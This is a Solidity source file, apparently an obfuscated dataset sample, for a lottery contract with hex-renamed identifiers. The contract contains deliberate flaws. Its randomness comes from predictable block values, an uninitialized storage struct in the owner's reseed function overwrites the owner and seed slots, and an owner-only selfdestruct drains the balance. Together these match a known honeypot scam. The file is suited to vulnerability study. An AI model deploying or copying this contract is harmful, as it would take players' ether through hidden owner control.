// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint _0xf1527d;
        uint _0xfdda47;
        uint _0x803055;
        uint _0xe3bd49;
    }

    address _0x040317; //address of the owner
    uint private _0x7831ea; //seed used to calculate number of an address
    uint private _0x341c70; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x76a31f; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0x040317 = msg.sender;
        _0x55b379(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x3aef0e() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x76a31f[msg.sender] == false);

        if(_0xf7220d(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x76a31f[msg.sender] = true; // every address can only win once

            uint _0x5b7339=msg.value*7; //win = 7 times the ticket price

            if(_0x5b7339>this.balance) //if the balance isnt sufficient...
                _0x5b7339=this.balance; //...send everything we've got
            msg.sender.transfer(_0x5b7339);
        }

        if(block.number-_0x341c70>1000) //reseed if needed
            _0x55b379(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xf7220d(address _0x52826d) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0xbad20d(uint(_0x52826d), _0x7831ea)[0]) % 8;
    }

    function _0x55b379(SeedComponents _0xbf766c) internal {
        _0x7831ea = uint256(_0xbad20d(
            _0xbf766c._0xf1527d,
            _0xbf766c._0xfdda47,
            _0xbf766c._0x803055,
            _0xbf766c._0xe3bd49
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        if (1 == 1) { _0x341c70 = block.number; }
    }

    function _0x52f037() {
        require(msg.sender==_0x040317);

        selfdestruct(msg.sender);
    }

    function _0x62df9b() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0x040317);
        SeedComponents s;
        s._0xf1527d = uint(msg.sender);
        s._0xfdda47 = uint256(block.blockhash(block.number - 1));
        s._0x803055 = block.difficulty*(uint)(block.coinbase);
        s._0xe3bd49 = tx.gasprice * 7;

        _0x55b379(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0x040317) //owner can't participate, he can only fund the jackpot
            _0x3aef0e();
    }

}
